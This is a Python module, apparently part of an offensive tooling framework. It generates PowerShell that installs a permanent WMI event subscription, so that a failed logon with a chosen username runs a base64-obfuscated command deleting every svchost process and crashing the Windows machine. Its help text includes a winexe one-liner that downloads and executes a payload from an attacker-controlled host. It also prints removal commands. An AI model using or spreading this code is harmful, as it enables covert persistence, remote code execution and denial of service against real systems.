#!/usr/bin/python
import sys
from support.setting import setting



class create:
    #define info here

    info = '''
This module creates a WMI filter where failing to logon with 'FailName' crashed the box by deleting running instances of svchost.

Once the payload has been generated, either copy and paste the commands into a system level powershell, or download via a powershell download and execute.

Ex:
winexe -U user%password //192.168.0.100 "powershell -c iex(New-Object Net.WebClient).DownloadString('http://192.168.0.136:8080/persist')"

''' 
    #create a list of possible options
    option_list=["FailName","filter","consumer","output_file","reset_auditpol"]
   

    #initialize variables
     
    FailName=setting("FailName","",True,"Name to fail logon")
    filter=setting("filter","ServiceFilter",True,"name of WMI filter")   
    consumer=setting("consumer","ServiceConsumer",True,"name of WMI consumer")
    output_file=setting("output_file","",False,"local output filename")
    reset_auditpol=setting("reset_auditpol","yes",True,"reset auditpol on removal?")
    
    #initialize power_beacon class
    def __init__(self):
        self.name="powerbeacon"
    def run(self) :

        FailName=self.FailName.value
        filter=self.filter.value
        consumer=self.consumer.value
        output=self.output_file.value
        reset_auditpol=self.reset_auditpol.value
         
        data= '''
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
$instanceFilter = ([wmiclass]"\\\.\\root\subscription:__EventFilter").CreateInstance()
$instanceFilter.QueryLanguage = "WQL"
$instanceFilter.Query ="select * from __InstanceCreationEvent where TargetInstance isa 'Win32_NtLogEvent' and TargetInstance.logfile = 'Security' and (TargetInstance.EventCode = '4625')"
$instanceFilter.Name = "%s"
$instanceFilter.EventNamespace = 'root\cimv2'
$result = $instanceFilter.Put()
$newFilter = $result.Path
$instanceConsumer = ([wmiclass]"\\\.\\root\subscription:CommandLineEventConsumer").CreateInstance()
$instanceConsumer.Name = '%s' 
$instanceConsumer.CommandLineTemplate  = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\powershell.exe -c "if(wevtutil qe security /rd:true /f:text /c:1 /q:`"*[System/EventID=4625]`" | findstr /i %s){powershell -e dwBtAGkAYwAgAHAAcgBvAGMAZQBzAHMAIAB3AGgAZQByAGUAIABuAGEAbQBlAD0AYAAnAHMAdgBjAGgAbwBzAHQALgBlAHgAZQBgACcAIABkAGUAbABlAHQAZQA=}"'
$result = $instanceConsumer.Put()
$newConsumer = $result.Path
$instanceBinding = ([wmiclass]"\\\.\\root\subscription:__FilterToConsumerBinding").CreateInstance()
$instanceBinding.Filter = $newFilter
$instanceBinding.Consumer = $newConsumer
$result = $instanceBinding.Put()
$newBinding = $result.Path

''' % (filter,consumer,FailName)

        remove_data= '''
$x="\\\.\\root\subscription:__EventFilter.Name='%s'"
([wmi]$x).Delete() 
$x="\\\.\\root\subscription:CommandLineEventConsumer.Name='%s'"
([wmi]$x).Delete()
$x='\\\.\\root\subscription:__FilterToConsumerBinding.Consumer="\\\\\\\\.\\\\root\\\\subscription:CommandLineEventConsumer.Name=\\"%s\\"",Filter="\\\\\\\\.\\\\root\\\\subscription:__EventFilter.Name=\\"%s\\""' 
([wmi]$x).Delete() 
''' % (filter,consumer,consumer,filter)
        if (reset_auditpol!="yes" and reset_auditpol!="no"):
            print "Enter 'yes' or 'no' for 'reset_auditpol'"
            return
        else:
            if reset_auditpol=="yes":
                remove_data=remove_data+"auditpol /set /subcategory:\"Logon\" /success:enable /failure:disable"

        if output=='':
            print data
            print "\n"
            print "To Remove"
            print "---------------------------------"
            print remove_data
            return
        else:
            output="output/"+output
            f = open(output,'w')
            f.write(data)
            f.close()
            output=output+"_remove"
            f = open(output,'w')
            f.write(remove_data)
            f.close()
            print "Files have been written..."
            return




